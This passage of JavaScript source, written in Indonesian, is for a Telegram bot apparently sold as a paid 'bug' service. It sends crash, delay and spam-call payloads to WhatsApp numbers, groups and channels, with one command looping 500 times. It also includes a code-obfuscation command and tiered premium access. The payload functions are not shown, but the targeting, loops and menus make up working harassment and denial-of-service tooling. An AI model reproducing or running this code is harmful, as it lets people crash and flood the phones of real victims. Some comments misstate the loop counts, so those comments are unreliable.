    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Gagal Bro, Coba Ulang\nContoh : /vampios 91×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim notifikasi awal dengan gambar
    await bot.sendPhoto(chatId, "https://files.catbox.moe/dd347m.png", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    // Proses pengiriman bug
    for (let i = 0; i < 2; i++) { // Kirim 3 kali langsung
        await VampiPhone(formatedNumber);
        await VampCrashUi(formatedNumber);
    }

    // Kirim notifikasi setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://files.catbox.moe/dd347m.png", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /vampios
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/delayinvis(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Sambungkan Ke WhatsApp Dulu Goblok!!!");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Siapa Ngentot!!! Bukan Premium Mau Access Bot");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number.\nExample: /delayinvis 91×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /vampblank 91×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim notifikasi awal dengan gambar
    await bot.sendPhoto(chatId, "https://files.catbox.moe/dd347m.png", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    for (let i = 0; i < 1; i++) { // Kirim 3 kali langsung
        await VampDelayInvis(formatedNumber);
    }

    // Kirim notifikasi setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://files.catbox.moe/dd347m.png", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /delayinvis
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/vampui(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Sambungkan Ke WhatsApp Dulu Goblok!!!");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Siapa Ngentot!!! Bukan Premium Mau Access Bot");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number.\nExample: /vampui 91×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /vampnewbeta 91×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim notifikasi awal dengan gambar
    await bot.sendPhoto(chatId, "https://files.catbox.moe/dd347m.png", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    for (let i = 0; i < 5; i++) { // Kirim 3 kali langsung
        await VampCrashUi(formatedNumber);
        await VampDelayInvis(formatedNumber);
    }

    // Kirim notifikasi setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://files.catbox.moe/dd347m.png", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /vampui
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/vampgroup(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (!whatsappStatus) {
    return bot.sendMessage(chatId, "❌ Sambungkan Ke WhatsApp Dulu Goblok!!!");
  }
  if (!premiumUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Lu Bukan Premium Tolol!!!");
  }
  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Masukin Link Grup Yang Bener!!!\nContoh: /vampgroup https://chat.whatsapp.com/xxxx");
  }

  const groupLink = match[1].trim();
  if (!/^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+$/.test(groupLink)) {
    return bot.sendMessage(chatId, "❌ Link Grup Salah!!!\nContoh: /vampgroup https://chat.whatsapp.com/xxxx");
  }

  const groupCode = groupLink.split("https://chat.whatsapp.com/")[1];

  try {
    await bot.sendMessage(chatId, "⏳ Sedang bergabung ke grup, mohon tunggu...");
    
    const groupInfo = await sock.groupAcceptInvite(groupCode);
    const groupId = groupInfo.id;
    
    await bot.sendMessage(chatId, "✅ Berhasil join grup! Sedang mengirim bug...");
    
    // Kirim bug ke dalam grup setelah join
    await VampGroup(groupId);

    await bot.sendMessage(
      chatId,
      `┏━━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓\n` +
      `┃╺╺╸〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼 𝗚𝗿𝗼𝘂𝗽〢╺╸╺\n` +
      `┃ Tᴀʀɢᴇᴛ Gʀᴏᴜᴘ: ${groupId}\n` +
      `┃ Cᴏᴍᴍᴀɴᴅ : /vampgroup\n` +
      `┃ Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs\n` +
      `┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    );
  } catch (err) {
    console.error("Error saat join atau kirim bug:", err);
    return bot.sendMessage(chatId, "❌ Gagal mengirim bug ke grup. Mungkin bot ditolak masuk atau link salah.");
  }
});
bot.onText(/\/vampch(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  // Cek apakah user punya izin
  const isAuthorized = isOwner || senderId === botNumber;
  if (!isAuthorized) {
    return bot.sendMessage(chatId, "❌ Lu Siapa Ngentot!!!\nLu Gak ada Hak Gunain Vampire Private");
  }

  // Cek apakah user memasukkan ID saluran
  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Masukkan ID saluran!\nContoh: /vampch id@newsletter");
  }

  let targetChannel = match[1].trim();

  // Eksekusi perintah kirim bug ke channel
  try {
    for (let r = 0; r < 500; r++) {
      await VampChannel(targetChannel);
    }

    bot.sendMessage(chatId, `✅ Pesan dikirim ke saluran *${targetChannel}* sebanyak 20 kali.`);
  } catch (err) {
    console.error("Error saat mengirim ke channel:", err);
    bot.sendMessage(chatId, "❌ Gagal mengirim ke saluran, coba lagi nanti.");
  }
});
bot.onText(/\/encrypthard/, async (msg) => {
    const chatId = msg.chat.id;
    const replyMessage = msg.reply_to_message;

    console.log(`Perintah diterima: /encrypthard dari pengguna: ${msg.from.username || msg.from.id}`);

    if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
        return bot.sendMessage(chatId, '😡 Silakan Balas/Tag File .js\nBiar Gua Gak Salah Tolol.');
    }

    const fileId = replyMessage.document.file_id;
    const fileName = replyMessage.document.file_name;

    // Mendapatkan link file
    const fileLink = await bot.getFileLink(fileId);
    const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
    const codeBuffer = Buffer.from(response.data);

    // Simpan file sementara
    const tempFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(tempFilePath, codeBuffer);

    // Enkripsi kode menggunakan JsConfuser
    bot.sendMessage(chatId, "⌛️Sabar...\n Lagi Di Kerjain Sama MOTU PATLU Encryptnya...");
    const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), {
        target: "node",
        preset: "high",
        compact: true,
        minify: true,
        flatten: true,
        identifierGenerator: function () {
            const originalString = "肀MOTUPALUTheKingOfBug舀" + "肀MOTUPALUTheKingOfBug舀";
            function removeUnwantedChars(input) {
                return input.replace(/[^a-zA-Z肀VampireTheKingOfBug舀]/g, '');
            }
            function randomString(length) {
                let result = '';
                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
                for (let i = 0; i < length; i++) {
                    result += characters.charAt(Math.floor(Math.random() * characters.length));
                }
                return result;
            }
            return removeUnwantedChars(originalString) + randomString(2);
        },
        renameVariables: true,
        renameGlobals: true,
        stringEncoding: true,
        stringSplitting: 0.0,
        stringConcealing: true,
        stringCompression: true,
        duplicateLiteralsRemoval: 1.0,
        shuffle: { hash: 0.0, true: 0.0 },
        stack: true,
        controlFlowFlattening: 1.0,
        opaquePredicates: 0.9,
        deadCode: 0.0,
        dispatcher: true,
        rgf: false,
        calculator: true,
        hexadecimalNumbers: true,
        movedDeclarations: true,
        objectExtraction: true,
        globalConcealing: true
    });

    // Simpan hasil enkripsi
    const encryptedFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(encryptedFilePath, obfuscatedCode);

    // Kirim file terenkripsi ke pengguna
    bot.sendDocument(chatId, encryptedFilePath, {
        caption: `
❒━━━━━━༽𝗦𝘂𝗰𝗰𝗲𝘀𝘀༼━━━━━━❒
┃    - 𝗘𝗻𝗰𝗿𝘆𝗽𝘁 𝗛𝗮𝗿𝗱 𝗝𝘀𝗼𝗻 𝗨𝘀𝗲𝗱 -
┃             -- 𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 𝗛𝗜𝗡𝗗𝗨 --
❒━━━━━━━━━━━━━━━━━━━━❒`
    });
});

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !resellerUsers.includes(senderId) && !superVip.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ Lu Bukan Owner Atau Admin Tolol!!!");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Lu Salah Idiot!!!\nContoh Nih Njing : /addprem 91×××.");
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Lu Salah Goblok!!!\nContoh Nih Njing : /addprem 91×××.");
  }

  if (!premiumUsers.includes(userId)) {
      premiumUsers.push(userId);
      savePremiumUsers();
      console.log(`${senderId} Added ${userId} To Premium`)
      bot.sendMessage(chatId, `✅ Si Yatim Ini ${userId} Berhasil Mendapatkan Access Premium.`);
  } else {
      bot.sendMessage(chatId, `❌ Si Yatim Ini ${userId} Sudah Menjadi Premium.`);
  }
});
bot.onText(/\/delprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !superVip.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ Lu Bukan Admin Atau Owner Tolol!!!");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Lu Salah Idiot!!!\nContoh Nih Njing : /delprem 91×××.");
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (premiumUsers.includes(userId)) {
      premiumUsers = premiumUsers.filter(id => id !== userId);
      savePremiumUsers();
      console.log(`${senderId} Dihapus ${userId} Dari Premium`)
      bot.sendMessage(chatId, `✅ Si Goblok Ini ${userId} Sudah Dihapus Dari Premium.`);
  } else {
      bot.sendMessage(chatId, `❌ Si Goblok Ini ${userId} Bukan Lagi Premium.`);
  }
});

bot.onText(/\/addowner(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !resellerUsers.includes(senderId) && !superVip.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Lu Ga Punya Access Tolol!!!");
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Lu Salah Idiot!!!\nContoh Nih Njing: /addowner 91×××.");
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
  if (isNaN(userId)) {
    return bot.sendMessage(chatId, "❌ Lu Salah Goblok!!!\nContoh Nih Njing: /addowner 91×××.");
  }

  if (!OwnerUsers.includes(userId)) {
    OwnerUsers.push(userId);
    saveOwnerUsers(); // Simpan perubahan ke superVip
    console.log(`${senderId} Added ${userId} To Owner`);
    bot.sendMessage(chatId, `✅ Si Yatim Ini ${userId} Berhasil Mendapatkan Access Owner.`);
  } else {
    bot.sendMessage(chatId, `❌ Si Yatim Ini ${userId} Sudah Menjadi Owner.`);
  }
});
bot.onText(/\/delowner(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Cek apakah user yang mengakses punya hak akses
  if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !superVip.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Lu Gak Punya Access Tolol!!!");
  }

  // Cek input yang diberikan user
  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Lu Salah Idiot!!!\nContoh Nih Njing: /delowner 91×××.");
  }

  // Ambil ID user dari input dan validasi
  const userId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
  if (isNaN(userId)) {
    return bot.sendMessage(chatId, "❌ Masukkan ID yang valid.");
  }

  // Cek apakah user yang dimaksud adalah superVip (owner)
  if (OwnerUsers.includes(userId)) {
    // Hapus dari superVip dan simpan perubahan
    OwnerUsers = superVip.filter(id => id !== userId);
    saveOwnerUsers(); // Simpan data terbaru
    console.log(`${senderId} Menghapus ${userId} Dari Owner`);
    bot.sendMessage(chatId, `✅ Si Goblok Ini ${userId} Sudah Dihapus Dari Owner.`);
  } else {
    bot.sendMessage(chatId, `❌ Si Goblok Ini ${userId} Bukan Owner.`);
  }
});
bot.on("callback_query", async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const senderId = callbackQuery.from.id;
    const senderName = callbackQuery.from.username ? `@${callbackQuery.from.username}` : `${senderId}`;
    const [action, formatedNumber] = callbackQuery.data.split(":");

    // Definisi variabel yang belum ada
    let whatsappStatus = true; // Ganti sesuai logic di kode utama
    let getOnlineDuration = () => "1h 23m"; // Placeholder function

    try {
        if (action === "ownermenu") {
            let ligma = `
𖤊───⪩  𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 𝟖.𝟎 𝐏𝐑𝐎  ⪨───𖤊
╭──────────────────────╮
│➼ Nᴀᴍᴇ : ${senderName}
│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @MOTU_PATALU_HINDU_HAI
│➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
╰──────────────────────╯
╭──────「 𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮 」──────╮
│➵ /addbot <Num>
│➵ /addprem <ID>
│➵ /delprem <ID>
│➵ /addowner <ID>
│➵ /delowner <ID>
╰──────────────────────╯
`;
            bot.sendPhoto(chatId, "https://files.catbox.moe/dd347m.png", {
                caption: ligma,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭",
                                url: "https://t.me/MOTU_PATALU_HINDU_HAI"
                            }
                        ]
                    ]
                }
            });
        } else if (action === "bugmenu") {
            let ligma = `𖤊───⪩  𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 𝟖.𝟎 𝐏𝐑𝐎  ⪨───𖤊
╭──────────────────────╮
│➼ Nᴀᴍᴇ : ${senderName}
│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @MOTU_PATALU_HINDU_HAI
│➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
╰──────────────────────╯
╭────── 「   𝐁𝐮𝐠 𝐌𝐞𝐧𝐮   」 ──────╮
│➥ /vampori 91×××
│➥ /vampbeta 91×××
│➥ /vampbussines 91×××
│➥ /vampios 91×××
│➥ /delayinvis 91×××
│➥ /vampui 91×××
╰──────────────────────╯
╭───「  𝐁𝐮𝐠 𝐆𝐫𝐨𝐮𝐩 & 𝐂𝐡𝐚𝐧𝐧𝐞𝐥  」───╮
│➢ /vampgroup <Link>
│➢ /vampch <Newsletter>
╰──────────────────────╯
`;
            bot.sendPhoto(chatId, "https://files.catbox.moe/dd347m.png", {
                caption: ligma,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭",
                                url: "https://t.me/MRMOTUPATLUCHAT"
                            }
                        ]
                    ]
                }
            });
        } else if (action === "toolsmenu") {
            let ligma = `𖤊───⪩  𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 𝟖.𝟎 𝐏𝐑𝐎  ⪨───𖤊
╭──────────────────────╮
│➼ Nᴀᴍᴇ : ${senderName}
│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @MOTU_PATALU_HINDU_HAI
│➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
╰──────────────────────╯
╭──────「 𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮 」───────╮
│➩ /fixedbug <Num>
│➩ /encrypthard <Tag File>
│➩ /cooldown <Num>
╰──────────────────────╯
`;
            bot.sendVideo(chatId, "https://files.catbox.moe/oa1xbd.mp4", {
                caption: ligma,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭",
                                url: "https://t.me/MRMOTUPATLUCHAT"
                            }
                        ]
                    ]
                }
            });
        } else if (action === "spamcall") {
            await spamcall(formatedNumber);
            await bot.sendMessage(chatId, `✅ Spamming Call to ${formatedNumber}@s.whatsapp.net.`);
        } else {
            bot.sendMessage(chatId, "❌ Unknown action.");
        }

        // Hapus loading di button
        await bot.answerCallbackQuery(callbackQuery.id);
    } catch (err) {
        bot.sendMessage(chatId, `❌ Failed to send bug: ${err.message}`);
    }
});

startWhatsapp()